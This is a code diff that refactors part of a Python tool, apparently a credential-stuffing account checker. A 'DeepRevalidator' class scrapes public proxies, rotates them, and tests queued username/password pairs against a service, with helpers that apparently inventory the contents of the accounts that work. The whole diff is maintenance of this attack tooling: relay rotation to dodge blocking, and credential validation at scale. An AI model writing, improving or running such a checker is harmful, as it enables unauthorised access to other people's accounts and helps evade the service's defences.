@@ -29,7 +29,7 @@ from nexus.config import (
 install_resilient_dns()
 
 from nexus.core.validator import validate_credential_tuple, parse_credential_line
-from nexus.core.proxy_pool import NetworkRelayPool
+from nexus.core.proxy_pool import NetworkRelayPool, NetworkRelay
 from nexus.core.proxy_scraper import scrape_fresh_proxies, filter_operational_proxies
 from nexus.core.transport import SessionTransportPool
 from nexus.core.library import extract_library_inventory, is_item_free
@@ -88,8 +88,8 @@ class DeepRevalidator:
         print("[RE-VERIFY] Ensuring operational proxy relays...")
         fresh_relays = await scrape_fresh_proxies(max_relays=120)
         valid_relays = await filter_operational_proxies(fresh_relays, concurrency=40)
-        self.relay_pool.inject_relays(valid_relays)
-        print(f"[RE-VERIFY] Relay pool active with {self.relay_pool.active_relay_count()} operational nodes.")
+        self.relay_pool.append_relays(valid_relays)
+        print(f"[RE-VERIFY] Relay pool active with {self.relay_pool.active_count} operational nodes.")
 
         queue = asyncio.Queue()
         for u, p in candidates:
@@ -105,27 +105,23 @@ class DeepRevalidator:
                 except asyncio.TimeoutError:
                     break
 
-                relay = None
-                relay_url = None
-                if self.relay_pool and self.relay_pool.active_relay_count() > 0:
-                    relay = self.relay_pool.acquire_relay()
-                    if relay:
-                        relay_url = relay.get_endpoint()
+                relay: Optional[NetworkRelay] = None
+                if self.relay_pool and self.relay_pool.total > 0:
+                    relay = await self.relay_pool.get_next_relay()
 
-                session = await self.transport_pool.acquire_session()
+                session = await self.transport_pool.get_session(relay)
                 result = None
                 try:
                     result = await validate_credential_tuple(
                         session=session,
                         username=user,
                         password=pwd,
-                        proxy=relay_url,
-                        timeout_seconds=15
+                        relay=relay,
+                        timeout=15
                     )
                 except Exception as ex:
                     result = {"status": "ERROR", "error": str(ex)}
                 finally:
-                    await self.transport_pool.release_session(session)
                     if self.relay_pool and relay:
                         self.relay_pool.release_relay(relay)
 
